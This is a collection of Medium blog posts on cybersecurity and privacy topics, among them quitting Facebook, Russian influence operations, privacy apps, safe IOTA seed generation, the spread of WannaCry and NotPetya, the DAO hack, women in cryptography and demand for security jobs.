One idea is limiting your Facebook use, but this will not make a difference. Facebook forces advertisers to “bid” for our time. If we check Facebook consistently, we will get served more ads at what is likely a lower rate per ad. If we check infrequently, the rate advertisers pay per ad will get higher. We aren’t hurting the platform at all. And, unless you log off, clear your cookies, and use a privacy plugin, Facebook can still track you across the web and sell that information to advertisers in order to target you more specifically — both on Facebook and other sites.
The only way to hold Facebook responsible for allowing for hate speech, online trolls, and Holocaust deniers on its platform is for us to quit. We’ve given the social network enough opportunities. And there are alternatives that replace the functionality of Facebook without sacrificing the ability to communicate and share information with friends. And these alternatives carry the added benefit of more privacy and security.
I’m not going to tell you to join another social network, like Minds or Diaspora, because it will be useless. Your friends and family are not on there, and getting them on a new platform is not worth the effort. My recommendation is to switch bit by bit to other avenues, maybe some of those listed below, and slowly disentangle yourself from Facebook. For the few instances where you need to access Facebook, you can use a tool like Mozilla’s Facebook Container so you can do it with more privacy, along with an ad-blocker like uBlock or Adblock Plus.
Slack has become the default communication platform for organizations and workplaces. It has far more functionality than a Facebook group and can be used easily on multiple platforms, including a web browser. Each channel has a unique login, so getting people to join is easy. Discourse is an even better option than Slack because it is open source, has better privacy protections, and gives users full control of data (Slack does allow companies or channel owners to pay to see all messages, even private ones).
Chat apps can allow you, in a more intimate setting, to share photos and communicate without the worrying oversight of Facebook’s algorithm, which can both hide content and harvest data for use in creating ads. Many have encryption embedded so you know no one except participants can easily see your content.
Avoid WhatsApp; it’s been ruined by Facebook, which acquired it in 2014, with even the former founders leaving huge sums of money to depart early. It already is backtracking on privacy promises and might start including ads. Also avoid WeChat, China’s do-it-all app, which has even more worrying privacy concerns than Facebook.
My recommendation is Telegram. It has good functionality, including real moderator capabilities, and it works on many platforms and operating systems and can even be used without a phone connection. Other options — Line, Signal, and Viber — are popular in certain countries, although all three lack the functionality and ease of use of Telegram. But if privacy is your main concern, you can’t beat Signal.
Facebook seems attractive for posting photos, but anything uploaded can be utilized by the company for nearly any purpose — even if you delete it. Moreover, the compression reduces the quality, and it’s incredibly difficult to later organize and download photos. Also avoid Instagram, another Facebook property that has been slowly integrating facets of its parent company, like ads and a manipulated algorithm. Avoid Google too, which also harvests data from your photos and has its own shady advertising apparatus.
Instead, try Dropbox, which has useful features to organize and share photos. Photobucket is also popular and very user-friendly. More secure alternatives are Unsee or Cluster, which has some great family-sharing features.
Studies show that fake news goes more viral than quality news, and Facebook’s solution to that has been to reduce how much news we get overall in our news feeds. Publishers are seeing dramatic drops in inbound traffic, which has another goal — keeping us stuck on Facebook.
Instead of relying on Facebook for news, try Pocket, a great app that lets you save news and makes personal recommendations based on the stories you like. It works on multiple platforms, and the developers are focused on building better ways for users to find quality news. To support a sustainable news media ecosystem, there’s Blendle, which carries a diverse selection of newspapers and allows you to pay based on what you read. Other news curation tools include SmartNews and Pulse, or you can set up your own RSS feeds through a reader like Feedly.
If we don’t exercise our power as consumers, it could get worse. Facebook is actively courting the world’s biggest market, China, and even developing censorship software to appease its regulators. The internet in China is becoming a dystopia, with control even more centralized in the hands of a few well-connected giants — like Baidu and Tencent — which give the central government direct access to data flows. Facebook wants to be part of that despite the fact that China is the source of many of its fake news and ad-related problems.
This is the future for Facebook: There are huge revenue opportunities in countries that have no interest in the free flow of information or democracy. Despite our complaints, Facebook will not — and cannot, due to its need to grow revenue — become a platform for sharing genuine, useful information. Extreme ads perform better, and we can’t expect Facebook to stop accepting money for the one thing that works on its platform.
The power is in our hands. We can #QuitFacebook. If we can’t, even after everything that has happened with this harmful social network, then hope may truly be lost for the internet as a global democratizing and empowering force. It’s not Mark Zuckerberg’s fault. It’s ours for refusing to act even when faced with an ever-growing mound of evidence.
Written by
","['Facebook', 'Social Media', 'Cybersecurity', 'Apps', 'Media']"
The Russian Way of Cyberwar - thaddeus t. grugq - Medium,https://medium.com/@thegrugq/the-russian-way-of-cyberwar-edb9d52b4876?source=tag_archive---------5-----------------------,"Theres good reason to believe the Russian intelligence agencies have just pulled off an amazing influence operation entirely within the cyber domain. This is a wonderful demonstration of cyber that encompasses many aspects of intelligence services (espionage, influence operations, disinformation/deception). These events show how Russia has combined their aggressive approach to intelligence operations with their increasingly sophisticated understanding of cyber.
Influence operations are when an intelligence service attempts to influence events in another country (basically.) The Russians are past masters at executing these sorts of operations, although the results can be widely variable. In the 1990s they covertly contributed to a Canadian politician’s campaign. They funded anti nuclear organisations during the Cold War. They recruited journalists, politicians and others who could influence events or public opinion. For more Russian influence operations, read the Estonian intelligence service’s yearly reviews (start with 2015).
There are a number of events, so lets put them in an ordered timeline and examine what just happened.
Reading this trail of events it is easy to see how a blown operation was rapidly transitioned into an influence operation and a disinformation/deception campaign to mitigate the blowback. Given that the media is currently reporting that the cover hacker was responsible, and not Russian intelligence services after all, it seems the deception operation is working.
The following analysis is based heavily on the work done by @pwnallthethings, see this Twitter thread.
The services that conducted the parallel cyber espionage operations were exposed by the CrowdStrike blog post and WashingtonPost story. The Russians original plan was probably to wash the documents by using WikiLeaks as a cut out (as they have allegedly done in the past). It is entirely possible that they had already leaked the documents to WikiLeaks. After the espionage op was blown and the Russians exposed as the source of any future DNC documents, they were forced to create a cover entity to provide plausible deniability. Welcome to the world: GUCCIFER2!
The cover, GUCCIFER2, is not a particularly good one. The GUCCIFER2 website has only a single entry, the one claiming responsibility for the DNC hack. There is no history of this entity existing before the operation began (the oldest Google result is the GUCCIFER2 website.) In future I expect that services will develop “cover” entities for use in times of crisis, just like they prepare safe houses before they need them. Note to agencies: preparing and maintaining cover hacker identities should now be considered standard tradecraft, part of “putting the plumbing in place.”
Writes Like a Russian
In particular, note this extremely unusual textual smiley face:
This is a Russian quirk using ))) instead of :) and placing them immediately after text. So, GUCCIFER2 is a Russian with excellent English.
Intelligence services have a process for analyzing data that they collect and processing it into a deliverable (called “product.”) In the case of a cyber operation that involved the collection of a large number of documents (thousands, they boast) the only feasible approach will be to assign multiple analysts to the task. Clearly, the documents must be analyzed, sorted, and selected for use in other operations (or processed into a product to aid policymaker decision making.)
Lots of Virtual Machines
The leaked documents show signs of being opened and processed on multiple (virtual?) machines. These machines had different username configurations, including one with the Cyrillic language setting and a username of “Iron Felix,” the first head of the Soviet intelligence services (at that time known as the Cheka; modern Russian intelligence officers frequently call themselves chekists.)
Russian Language Settings
One of the documents provided to Gawker directly by the “lone hacker” GUCCIFER2 was processed on a system using the Russian language setting. The same document on the cover hacker’s website was not. Why would a single hacker process a document twice, once in Russian and once in English, and then leak both versions simultaneously? This difference suggests a team rather than a “lone hacker.”
Russian Favored Cracked Software
The software used during the analysis process was a cracked version of Office 2007, one that happens to be popular in Russian.
Summary
There are persistent rumors of Russian intelligence services have a close working relationship, or at least an understanding, with Wikileaks. Whether this is true or not, the Russian intelligence services have used WikiLeaks as a cut out in the past.
When conducting intelligence analysis, the alternative competing hypothesis method is one of the better ones to reduce cognitive errors. While there are a large number of easily controlled and spoofable data points, they are all consistent with a Russian actor. There may be another service that has worked to lay a false trail pointing to the Russians. If so they have successfully:
It is fair to say that if this was not a Russian operation, someone went to tremendous trouble to conduct an operation that the Russians would have happily done themselves.
The Russian intelligences services are truly world class. After losing access to a strategic source of information, and being exposed, they managed to rapidly execute an influence operation and a deception operation to mitigate damage. This is very nimble and responsive, and demonstrates a deep understanding of cyber as an information domain.
My sincere thanks to @pwnallthethings for the investigative and analytic work.
Originally written before June 16th:
Only posted in Jan 11th, 2017 cause it seems like it is far past the point where the opinions and analysis of anyone actually matters.
Due to issues with white space, the base64 version is available here.
Written by
","['Cybersecurity', 'Security', 'Operational Security']"
These 7 Apps Will Keep You From Getting Hacked - Product Hunt,https://blog.producthunt.com/these-7-apps-will-keep-you-from-getting-hacked-f94ed1588469?source=tag_archive---------5-----------------------,"It seems like every other day, a major site that we trust gets hacked, and just like that—poof!—our personal data is leaked. Even if you’ve never had something crazy happen to you like identity theft, you’ve likely received a slightly concerning email from a company that goes something like, “A bunch of crazies stole our data and we don’t think you have any reason to worry, but just in case, CHANGE YOUR PASSWORDS ON ALL OF THE THINGS NOW.” �
The challenge of maintaining your privacy on the web isn’t going away any time soon, so it’s best if you protect yourself now—at home and at work. Here are a list of tools that will make you less vulnerable to tracking, phishing, and other shady internet behavior.
(check out the Don’t Get Hacked collection on Product Hunt for the full list)
Get a new virtual card for every transaction.
Well, this is cool. Privacy gives you a brand new card number for every transaction you make online, which is meant to protect you from card fraud, identity theft, and data breaches. The process is simple: download the Chrome extension after you sign up, and when you check out on any website, the Privacy icon will appear in the card form. Just click on it to create a new card, and the rest of the form will autofill. Once the “card” is charged, money will be withdrawn out of a funding account of your choice. There are a bunch of fancy details about Privacy’s policy (which you can find here). The most important, though, is that this tool is PCI-DSS compliant, which means you can expect the same security standards your bank has.
Browse safely on public WiFi with this VPN for iOS.
Cloak keeps you safe on public WiFi with no hassle. There’s an auto-secure feature that makes this app turnkey; you don’t even need to remember that you have it on your phone. All you have to do is connect to a network, and you’ll be automatically protected. Cloak also knows which networks you trust, automatically securing your connection whenever you use an untrusted network. This is a painless way to safeguard against unwanted monitoring or DNS poisoning, and the clean UX makes it much easier (and more intuitive) to use than most other VPNs out there.
Lock and unlock your Mac automatically with your iPhone.
This cool app will lock your laptop as soon as you walk away from it, and then unlock it when you return—magic! Here’s the idea: you carry your smartphone with you basically all of the time, so why not utilize this pre-existing behavior to keep all of your digital files and private data safe? Of course, the catch is that you actually have to have your phone with you for Tether to work properly. But, if it secures your privacy and takes a step out of your workflow (no more manual computer log-ins!), then it’s probably worth trying.
Create a recipe and forget your passwords.
Password Chef is a clever approach to password management. The app will help you design a “recipe” (i.e. personal algorithm), which generates complex and unique passwords for each of your accounts that you can remember even without sticky notes and password managers. Even though security breaches are becoming more commonplace, many of us still don’t take the precautions we should, like using a completely different password for every site. The result? It becomes much easier for a hacker to gain access to your most valuable accounts—banks, email, file hosting, social media, and more. Here’s one example of a recipe via Password Chef (clever name):
Give this one a try—especially if you’d prefer not to keep your passwords stored somewhere on the Internet, and would rather remember them instead (without the mental load required to memorize dozens—or hundreds—of unique password combinations).
Securely share information with your team.
There’s nothing worse than trying to hunt down a password to a team account at work. Which, of course, you often end up getting via email or chat (the internet security police are pissed right about now). Sometimes, keeping track of team accounts and passwords can feel like an extra job.
Luckily, there are a number of great password safety tools out there, and 1Password is one of the best. There are multiple different variations of the product — for individuals, teams, and families — so there’s a solution for everyone. You can also share more than just passwords; you can use it to manage sensitive finances and documents, as well. This is definitely a tool worth trying — especially if you find yourself needing to share secure documents and account information often.
Team password manager, cloud identity, and access management.
Meldium is a super simple tool that gives you secure access to all of your apps. The best feature? You’ll automatically be logged into your favorite websites and apps without needing to type in usernames and passwords. This tool (which the Product Hunt team uses) also makes the onboarding process much easier. When someone new joins your company, Meldium will automatically create their accounts on every web application your team needs. No more spending a ton of time getting new teammates set up with all of the necessary accounts; now it’s easy to share website and app data without ever exchanging a password.
An iPhone app that blocks ads, tracking, and malicious content.
Better truly lives up to its name. The creators make it a point that this app is not an ad blocker; it’s a behavioral ad blocker. The goal? “Make the web safer, lighter, and faster in line with the principles of ethical design.” This is a really thoughtful app, designed to protect you from sites that track your behavior online (which feels like it happens all the time these days). So why this content blocker? Better goes beyond an app; it’s an educational resource with in-depth research and documentation on trackers and editorial spotlights. This blurb says it all:
…Need we say more?
The idea of getting hacked is pretty unnerving, but it doesn’t have to be. We hope you found something on this list that you’ll use to stay safe. And if you’re looking for more products to keep you from getting hacked? Check out the full list here on Product Hunt:
Written by
","['Top Products', 'LIVE', 'Books', 'Company', 'Archive', '� Newsletter', 'Tech', 'Startup', 'Security', 'Productivity', 'Cybersecurity']"
The Secret to Security — Is Secrecy - IOTA,https://blog.iota.org/the-secret-to-security-is-secrecy-d32b5b7f25ef?source=tag_archive---------7-----------------------,"In today’s world, security is imperative for maintaining control of your belongings whether physical or virtual. Cyber security is vital to keeping you protected, safeguarding your integrity, and avoiding unwanted data disclosure. IOTA provides robust cyber security measures around data integrity and confidentiality, and is even future proof against quantum attacks. While these technological security features are a major benefit to using public/private key encryption, the keys themselves rely on more “human” security measures. It is this latter type of security that is most frequently the weak link.
Recently, a large number of unfortunate users fell victim to an attack against the IOTA community. The attackers in this instance correctly identified this “human element” as the weak link. By using a well-crafted phishing website that appeared to be a legitimate IOTA seed generator, they were able to collect a large number of seeds over a long period of time. They preyed upon the trust of the community, and spent time carefully optimizing the page to appear higher in search engine results, further legitimizing their scam in the eyes of unsuspecting community members.
Unfortunately, this is not the first nor will it be the last time such a scam is perpetrated against IOTA, or digital ledger technologies more broadly. Nevertheless, there are some things you can do to keep yourself safe, the first and foremost of these being to keep your secrets secret.
There is only one way to “prove” who owns a given IOTA address, and that is to spend from it. To spend from an address, one only needs to know the seed from which the address originated. The key takeaways of these facts are:
To put in the simplest possible terms: treat your seed as if it were the only key to your safe. Whoever holds the key has direct access to the contents of the safe. There is a common English idiom that says “possession is 9/10ths of the law.” In IOTA (and indeed, most of the DLT space), possession is the law.**
Creating A Seed, Safely
First and foremost, do not create your seed on a website simply because it appears high up on a list of search results. Better yet, do not use an online seed generator, period.
Choosing a seed is a simple process, in theory: randomly write down uppercase letters (A-Z) and the number 9 on a piece of paper until you have 81 characters written. That’s it, you’re done!
Unfortunately, humans are generally bad at choosing things randomly, so we can use a few tools to increase the randomness of our seed. If you are on Linux or MacOS, you’re in luck! Creating a seed safely and securely on Linux or MacOS takes just a single terminal command. If you’re not comfortable with the terminal, don’t worry, you only need to copy and paste a single command to create the seed.
Linux:
cat /dev/urandom |tr -dc A-Z9|head -c${1:-81}
Mac OSX:cat /dev/urandom |LC_ALL=C tr -dc 'A-Z9' | fold -w 81 | head -n 1
Remember, your IOTA seed is the key to your safe, and you should always take the extra step to make sure your key is secure. Copy your seed somewhere safe (like an encrypted password database, e.g. KeePass), and after you have copied it, randomly change at least 10 letters (remember: uppercase A-Z and the number 9 only). Save your changes. If you’re writing the seed down, change 10 letters as you write.
If you are on Windows, you can use KeePass directly. Set the password generator to use the symbols A-Z and the number 9, and set a password length of 81. Again, make sure to change at least 10 letters before saving and using the seed.
You can also use KeePassX on Linux or MacOS, but at the time of this writing there is no way to limit your character choices to A-Z and 9. Instead use “A-Z” and then randomly change at least 10 letters and randomly change some letters to the number 9.
The purpose of this somewhat more complicated routine should be clear by now. After doing these steps, you can be 100% sure, or as close to it as technically possible, that:
From now on, keeping your seed safe is up to you and you alone. We offer some tips in the next section.
Storing Your Seed, Safely
You can store your seed easily offline by printing it out and keeping it in a safe place. A physical safe or a safe deposit box are ideal. This means: do not pin it on a board in the kitchen, or on a post-it note stuck to your monitor. If you put it in a filing cabinet under your desk, at least make sure the filing cabinet can be locked. Some Dos and Don’ts for keeping your seed safe:
P.S: Creating a safe passphrase might seem a daunting task. These simple tips should get you on your way:
Here is an example:
It takes three years to learn to speak, a lifetime to learn to listen and shut up!
Would become:
Ittakes3yearstolearntoSPEAK,Alifetimetolistenandshut-UP!
REMEMBER:
Digital ledger technology is unique in that there is no need for an intermediary, such as a bank, to maintain control of your assets. This sounds great in theory — you maintain full control over your own assets! The practical consequence, however, is that you are also fully responsible for their security. All physical and digital security measures you put in place are rendered useless if you disclose sensitive information such as a seed, password or pin code.
What’s more, this responsibility starts at the very beginning. Following best practices for maintaining your seed will not do you any good if your seed was stolen at the moment it was created. All of your security measures — your password database, your passphrase, your bank vault — were obsolete before you even set them up. If you’re not absolutely positive about how to create a seed in a secure fashion, STOP. Join the IOTA Discord and ask the #help channel for how to proceed.
Neither IOTA Foundation nor anyone else can recover stolen tokens.
Please be responsible.
*This is not proof in any legal sense, but rather in the mathematical sense. You can prove, mathematically, that you have control over tokens in a digital ledger only by spending the token.** Again, the word law is used here as a metaphor — possession of the seed means that you are mathematically capable of spending the funds it contains. This is a “mathematical law.”
Written by
","['Announcements', 'Vision', 'R & D', 'Ecosystem', 'Tech Updates', 'Newsletter', 'IOTA.org', 'Security', 'Iota', 'Cybersecurity', 'Digital Wallet', 'Vision']"
The Shadow Internet - Comae Technologies,https://blog.comae.io/the-shadow-internet-d42b7195a118?source=tag_archive---------5-----------------------,"Yet Another Worm eveNt (YAWN) is spawning a flurry of infosec marketing blog posts. There’s the technical analysis, the “how to block the last attack” posts, the “why are we still failing?” self-flagellation, and the transparent “how our product would have blocked the last attack.” This analysis is not a technical deep dive, a basic security guide, or any of the other predictable post-incident blogs. I want to look at the bigger lesson that the last three big worms (WannaCry, NotPetya, BadRabbit) have vividly exposed, and yet has been essentially overlooked. The lesson is:
Compromise local, infect global — using only lateral traversal techniques — using the Shadow Internet
The three autonomous malicious agents share one major significant feature — propagation via lateral traversal techniques — and a similar payload, however they differ in other aspects. Importantly, each worm appears to have been developed to different operational requirements and released with different intent, resulting in divergent implicit targeting scope. Despite having different targeting goals, they all managed to achieve the same result — global infection.
The threat actors behind the worms appear to be different (WannaCry was linked to Lazarus group, NotPetya/BadRabbit to BlackEnergy), and the motivation for releasing the worms appear to differ:
Critically though, each worm used only lateral traversal methods, and the latter two restricted themselves to only accessible targets. Despite these limitations on mobility, which objectively should seem to limit the victims to intranet targets within the confines of a network perimeter, these worms became global epidemics. This empirically demonstrates that there is a Shadow Internet of linked networks that provides pathways to compromise targets globally without targeting public facing Internet systems.
The artificial conceptual idea of a private bounded intranet, and a public Internet is mostly fantasy. Cold reality is that alongside the public Internet, there is a private Shadow Internet which connects intranets to each other in unpredictable ways. The Home Depot breach revealed deliberate exploitation of this Shadow Internet (attackers gained access to a trusted supplier and then used their private connection to reach Home Depot’s network).
The porous nature of perimeter defences is nothing new, nor is attacker abuse of trust relationships, these worms merely reveal the global reach of these problems. Aggressive autonomous malware has demonstrated, repeatedly, just how many private networks are connected to each other. A sort of infosec “six degrees of separation.”
The worms all used different initial entry vectors to gain a foothold compromise before beginning their autonomous sideways trek through the dark and twisty maze of the Shadow Internet.
The worms have shown that threat actors are not only incorporating lessons learned from previous events (tactical diffusion), but are also innovating and trying out new techniques.
12 May 2017 — WannaCry28 June 2017 — NotPetya24 October 2017 — BadRabbit
BadRabbit target enumeration is the same as NotPetya including bugfixes such as below.
The connections traversed by these malicious agents reveal unmapped, poorly explored, and extremely dangerous portals link diverse organisations into a Shadow Internet. Not only are many networks one 0day away from total compromise, but they are just a few twisty dark passages away from a network that’s one 0lday away from compromise. The Shadow Internet is a serious problem — risk is transitive.
Written by
","['Products', 'Labs', 'Events', 'Hire Comae', 'Cybersecurity']"
The Story of the DAO — Its History and Consequences,https://medium.com/swlh/the-story-of-the-dao-its-history-and-consequences-71e6a8a551ee?source=tag_archive---------3-----------------------,"One of the most incredible concepts to be successfully implemented through blockchain technology is the DAO, a decentralized autonomous organization. Decentralized autonomous organizations are entities that operate through smart contracts. Its financial transactions and rules are encoded on a blockchain, effectively removing the need for a central governing authority — hence the descriptors “decentralized” and “autonomous.”
The Decentralized Autonomous Organization (known as The DAO) was meant to operate like a venture capital fund for the crypto and decentralized space. The lack of a centralized authority reduced costs and in theory provides more control and access to the investors.
At the beginning of May 2016, a few members of the Ethereum community announced the inception of The DAO, which was also known as Genesis DAO. It was built as a smart contract on the Ethereum blockchain. The coding framework was developed open source by the Slock.It team but it was deployed under “The DAO” name by members of the Ethereum community. The DAO had a creation period during which anyone was allowed to send Ether to a unique wallet address in exchange for DAO tokens on a 1–100 scale. The creation period was an unexpected success as it managed to gather 12.7M Ether (worth around $150M at the time), making it the biggest crowdfund ever. At some point, when Ether was trading at $20, the total Ether from The DAO was worth over $250 million.
In essence, the platform would allow anyone with a project to pitch their idea to the community and potentially receive funding from The DAO. Anyone with DAO tokens could vote on plans, and would then receive rewards if the projects turned a profit. With the financing in place, things were looking up.
However, on June 17, 2016, a hacker found a loophole in the coding that allowed him to drain funds from The DAO. In the first few hours of the attack, 3.6 million ETH were stolen, the equivalent of $70 million at the time. Once the hacker had done the damage he intended, he withdrew the attack.
In this exploit, the attacker was able to “ask” the smart contract (DAO) to give the Ether back multiple times before the smart contract could update its balance. Two main issues made this possible: the fact that when the DAO smart contract was created the coders did not take into account the possibility of a recursive call and the fact that the smart contract first sent the ETH funds and then updated the internal token balance.
It’s important to understand that this bug did not come from Ethereum itself, but from this one application that was built on Ethereum. The code written for The DAO had multiple flaws, and the recursive call exploit was one of them. Another way to look at this situation is to compare
Ethereum to the Internet and any application based on Ethereum to a website — If a site is not working, it doesn’t mean that the Internet is not working, it merely says that one website has a problem. The hacker stopped draining The DAO for unknown reasons, even though he could have continued to do so. The Ethereum community and team quickly took control of the situation and presented multiple proposals to deal with the exploit.
However, the funds were placed into an account subject to a 28 day holding period so the hacker couldn’t complete his getaway. To refund the lost money, Ethereum hard forked to send the hacked funds to an account available to the original owners. The token owners were given an exchange rate of 1 ETH to 100 DAO tokens, the same rate as the initial offering.
Unsurprisingly, the hack was the beginning of the end for the DAO. The hack itself was contested by many Ethereum users, who argued that the hard fork violated the basic tenets of blockchain technology. To make matters worse, on September 5, 2016, the cryptocurrency exchange Poloniex delisted DAO tokens, with Kraken doing the same in December 2016.
All of these issues pale in comparison to the United States Securities and Exchange Commision (SEC) ruling that was released on July 25, 2017. This report stated:
“Tokens offered and sold by a “virtual” organization known as “The DAO” were securities and therefore subject to the federal securities laws. The Report confirms that issuers of the distributed ledger or blockchain technology-based securities must register offers and sales of such securities unless a valid exemption applies. Those participating in unregistered offerings also may be liable for violations of the securities laws.”
In other words, The DAO’s offering was subject to the same regulatory principles of companies undergoing the initial public offering process. According to the SEC, The DAO violated federal securities laws, along with all of its investors.
Though The DAO project has since folded, its impact is ongoing. Current blockchain development teams continually looked to The DAO’s example for guidance — for what not to do.
First, The DAO teaches a valuable lesson about the importance of establishing secure blockchain platforms. The DAO’s hack was not due to a problem inherent on the Ethereum blockchain; it came from a coding loophole exploited by an intelligent hacker. Had the code been written correctly, the hack could have been avoided.
Second, the SEC’s ruling on The DAO has encouraged blockchain startups to come up with ways of avoiding security registration and federal regulation. One of the ways companies do this is by using the SAFT method. If tokens have legitimate utilitarian value on a blockchain platform,
they violate a component of the Howey case, and therefore cannot be listed as securities or regulated by the SEC.
Without the DAO, who knows what lessons would still need to be taught.
Written by
","['Top Story', '▫️Medium Things▫️', 'Ethereum', 'Bitcoin', 'Tech', 'Technology', 'Cybersecurity']"
The UK’s History of Pioneering Women in Cybersecurity,https://medium.com/the-internet-of-women/the-uk-s-history-of-pioneering-women-in-cybersecurity-cf99520b97ba?source=tag_archive---------9-----------------------,"Cybercrime is set to become the United Kingdom’s most common offense overtaking any other kind of crime in the country. The National Crime Agency announced losses from such crimes exceeding over £16 billion pounds annually making up a significant proportion of what the UK loses from organized crime. In our upcoming book, The Internet of Women, Why It Matters, I’ll be examining the history of women in this emerging field as well as highlighting role models that have appeared in popular culture.
Historically women in the UK have played prominent roles in cybersecurity. The Bletchley Park codebreaking operation during World War II was made up of nearly 10,000 people and about 75% of the workforce were women. That in itself is an amazing statistic, when during the 1940's most women did not even possess a bank account. Much of the work was manual nature in terms of crunching out numbers. But there were a few remarkable women who are finally being recognized as cryptanalysts working at the same level as their male peers:
· Mavis Batey (formerly Lever) — She was known for her great language skills and logical thinking
· Margaret Rock — She was a graduate mathematician from Bedford College London (now part of Royal Holloway College where I studied cryptography)
Both Mavis and Margaret joined Dilly Knox and his all female team in the “Cottage” and broke many ciphers.
· Joan Murray (formerly Clarke) — Another mathematician from Cambridge (who is represented in the film “The Imitation Game”) eventually became the Deputy Head of the “Hut” — a rare occasion for a female to hold a leadership position
· Ruth Briggs — A language scholar from Cambridge
My other blast from the past was on a recent trip to Bletchley for an off-site meeting which was being held in The National Museum of Computing. A fantastic collection of the advances of computing through the ages, complete with the machines that helped break the enigma code. But there was one beautiful piece of mechanical engineering — the oldest working computer. When working out a computation the valves lit up in a hypnotic way before producing the answer. That wasn’t the most fascinating find. It was an old black and white photograph which was displayed in front of the working computer. It was the final set of computer scientists who were completing their research — and it was 50% women.
There’s a huge opportunity for technologists such as myself to do more outreach to educate and encourage young women to not only learn to code but also exposes them to opportunities in the cyber security field.
Also, no one should underestimate the power and influence of the media. I began to ask myself, what kind of role models are being portrayed. More recently we have seen worthy interpretations.
Let’s take three examples:
1. The Imitation Game: Based on the story of Alan Turing trying to hack the enigma code. Here the cryptographer,Joan Clarke is finally portrayed on screen by Keira Knightley. I personally felt they attempted to downplay any hint of glamour or particular femininity. Joan was there for her intelligence and higher ability than the other male cross-word completers at the interview.
2. The Da Vince Code: We are introduced to Sophie Neveu who is a police cryptographer. The undertones of the movie itself is littered with the balance between male and female, with Sophie proving to be the yin to the yang of Langdon. Men and women work together toward a goal without the female being subordinate to the male in any way. Sophie is quick witted, agile, caring, compassionate and brilliant. She also has a PhD from Royal Holloway College just like me!
3. CSI: Here the special agent Avery Ryan works to solve crimes as a CyberPsychologist for the FBI. Not only do we get a view of the extent of cyber crime outside hacking, including cyber-theft and the introduction to the dark net. But we are also introduced to a new kind of role — the combination of psychologist with cyber skills that create a “hack for good” culture. The Avery Ryan character is based on the real-life pioneering psychologist Professor Mary Aiken — another awesome role-model.
Despite the growing demand and tremendous opportunities in the job market, cybersecurity remains an area where there is a significant shortage of skilled professionals regionally, nationally and internationally regardless of gender. Nearly two million global cybersecurity professionals will be needed by 2017, according to the National Cybersecurity Institute at Excelsior College.
This is a huge growth market. It is a highly technical and specialized area but it is also encompasses a community that ranges from focused hobbyists, professionals, and academia. All three areas contribute to the current climate of cybersecurity and in each area we need diversity to be able to change the situation of IT Security in this new world.
Dr. Alison Vincent is the Chief Technology Officer for Cisco in the UK and Ireland. She also serves as the focal point for innovation and technical leadership in the UK and Ireland technical community. In numerous organizations she has introduced agile methodologies, transforming software engineering to focus on customer value and improved time to market. Alison is an ambassador for Women In Science and Engineering (WISE) and Science Technology Engineering and Maths (STEMnet) ensuring an on-going technical talent in the workforce. She has previously held senior positions at both IBM and Micro Focus Ltd. She completed her PhD in Cryptography and a BSc in Mathematics and Computer Science both from London University.
Written by
","['Cybersecurity', 'Edtech']"
The Unbelievable Demand for Cybersecurity Workers - OneZero,https://onezero.medium.com/the-insane-demand-for-cybersecurity-workers-cb98abf964bc?source=tag_archive---------2-----------------------,"Angela Gunn is fried. With three cases going and a fourth just getting started, this is one of those frantic periods when it feels as if she works in an ER or at a fire station rather than holding a staff position with a computer security firm.
It’s people like Gunn that organizations large and small call if they’ve had a data breach or suspect they have. People in the industry — cybersecurity, if you’d like, though Gunn’s preference is information security, or “info-sec” for short — call this “incident response.” To my mind, though, they’re the online world’s firefighters: those who rush to put out the flames and then assess the damage.
As an incident response consultant for British security firm BAE Systems, Gunn is in charge of assembling a small crew for each case. Typically, that includes an analyst who can pore over computer logs, a malware specialist, and those she dubs “forensic workers, except without the formaldehyde smell and ripped-open chest cavities.” That is, if she can find any live bodies to do the work.
“Right now, I’d sell a right toe for a forensics guy,” Gunn says. “Like a lot of people in info-sec right now, we’re agonizingly understaffed.”
A 2015 report by job analytics firm Burning Glass Technologies found that postings for cybersecurity had grown more than three times faster than other information technology (IT) positions and roughly 12 times faster than all other jobs. The firm also reported that those working in cybersecurity on average earn nearly 10% more than others in IT.
There’s good reason behind the growth: Cybercrime caused an estimated $3 trillion in damages in 2015, according to research firm Cybersecurity Ventures. The company expects that figure to double to $6 trillion by 2021. Corporations face a “defender’s dilemma,” which Dave Weinstein, a security manager inside Google, summed up this way: “The defender has to be strong everywhere, every day. The attacker only has to win once.” For each set of bad guys, the defense side needs veritable armies, beefing up armaments and rushing to the rescue at the first sign of an attack.
“If someone has six months to a year of work and when they came in for an interview, they didn’t pee on the rug, they’re going to make in the neighborhood of $85,000.”
The march of technology, in other words, has created a huge demand for ethical hackers, or “white hats”: people skilled at using computers who can protect our systems and battle those with bad intentions. By now, any university offering a computer science degree invariably offers classes in security. The more forward-looking among them have created a dedicated computer security department and offer a bachelor’s degree in cybersecurity. Still, businesses are having a hard time finding people to work computer security.
At the end of 2018, for instance, there were more than 26,000 openings for cybersecurity analysts (average pay: $85,000 a year), according to CyberSeek, which is part of a program nested under the U.S. Department of Commerce. “If someone has six months to a year of work and when they came in for an interview, they didn’t pee on the rug, they’re going to make in the neighborhood of $85,000,” Angela Gunn says. “If they have a special skill — if they have experience doing database scanning or maybe they worked as a programmer before moving to security — then they’re going up to 110, 120, 125.” For those with five or more years of experience, she said, the salaries start at $150,000. “There was never a cybersecurity job that I took where I was like, ‘Man, I wish I could make more money,’” said Billy Rios, who worked for Microsoft and then Google before venturing off on his own.
How crazy is the demand for quality people in info-sec? A security reporter I know was wearing a free T-shirt he had picked up at an industry event while waiting for a table at a San Francisco restaurant. A stranger struck up a conversation: “My company is hiring security people. You have a résumé?” The on-the-spot recruiter worked for Square, a publicly traded mobile payments company worth in the tens of billions.
All told, according to CyberSeek, just over 700,000 people were working cybersecurity for U.S.-based businesses and other organizations in 2018, not including 300,000-plus unfilled positions. The data point in 2017 that had people inside the cybersecurity world buzzing was a prediction by Cybersecurity Ventures that by 2021, there will be roughly 3.5 million unfilled cybersecurity jobs across the globe.
“It’s a cool job,” security entrepreneur Allison Wong tells young women exploring options for their tech careers. “If you stay in it for four years and show you’re good, you’ll make in the six figures. And not just the low six figures.” Plus, one more advantage, she tells them: “It’s not a job you can get bored at. If you get bored, you’re doing something wrong.”
Written by
","['CONSUMER TECH', 'DIGITAL LIFE', 'INDUSTRY', 'SCIENCE & MEDICINE', 'ABOUT', 'Cybersecurity', 'Industry', 'Cybercrime', 'Ethical Hacking', 'Infosec']"
"The Verge Hack, Explained - The Abacus Crypto Journal",https://blog.theabacus.io/the-verge-hack-explained-7942f63a3017?source=tag_archive---------1-----------------------,"Time Warps, Mining Exploits, Denial of Service, and More!
